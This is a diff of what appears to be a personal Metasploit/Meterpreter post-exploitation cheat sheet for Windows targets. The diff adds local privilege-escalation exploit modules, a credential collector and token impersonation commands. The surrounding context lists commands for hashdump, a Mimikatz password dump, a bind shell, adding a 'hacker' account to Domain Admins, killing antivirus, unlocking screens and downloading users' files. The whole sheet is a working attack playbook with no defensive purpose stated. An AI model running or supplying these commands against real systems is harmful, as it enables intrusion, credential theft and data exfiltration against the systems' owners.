@@ -156,6 +156,14 @@ migrate
 getuid
 getsystem
 getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.
+
+Other options:
+use post/windows/escalate/droplnk
+use exploit/windows/local/service_permissions
+use exploit/windows/local/trusted_service_path
+use exploit/windows/local/ppr_flatten_rec
+use exploit/windows/local/ms_ndproxy
+use exploit/windows/local/ask
 ------------------------------------------------------------------------------------------------------
 
 # Dump hashes & passwords
@@ -164,6 +172,7 @@ hashdump                                      Try to dump password hashes. If th
 ps                                            Show running processes.
 migrate <pid>                                 Migrate to a specific process running as NT AUTHORITY\SYSTEM.
 hashdump
+run post/windows/gather/credentials/credential_collector
 
 load kiwi                                     Mimikatz
 lsa_dump                                      Show the current user password in plain text.
@@ -240,6 +249,14 @@ use multi/handler
 set PAYLOAD windows/shell_bind_tcp
 set RHOST <target IP>
 exploit
+------------------------------------------------------------------------------------------------------
+
+# Tokens
+
+use incognito
+list_tokens -u
+list_tokens -g
+impersonate_token <domain>\\<user>
 ------------------------------------------------------------------------------------------------------
 
 # Pivoting
@@ -361,37 +378,11 @@ run vnc
      if the screen is locked exit VNC
      run screen_unlock
 
-run get_application_list
-run winenum
-
-run enum_logged_on_users
-
-run getgui -u hacker -p password
-
-use incognito
-list_tokens -u
-impersonate_token <domain>\\<user>
-
 add_user hacker password -h <target IP>
 add_group_user "Domain Admins" hacker -h <target IP>
 
 upload <local path> <remote path>
 upload /root/putty.exe C:\\Documents\ and\ Settings\\Administrator\Desktop\
-
-run checkvm
-run getcountermeasure
-run get_local_subnets
-run killav
-run getgui -e
-<open a new tab>
-rdesktop <target IP>
-
-run gettelnet -u root -p toor
-<open a new tab>
-telnet <target IP>
-root
-toor
-dir
 
 # Find and download files
 run search_dwld "%USERPROFILE%\\my documents" passwd
@@ -402,4 +393,3 @@ run search_dwld "%USERPROFILE%\\desktop" office
 # Alternate 
 download -r "%USERPROFILE%\\desktop"  ~/
 download -r "%USERPROFILE%\\my documents"  ~/
-
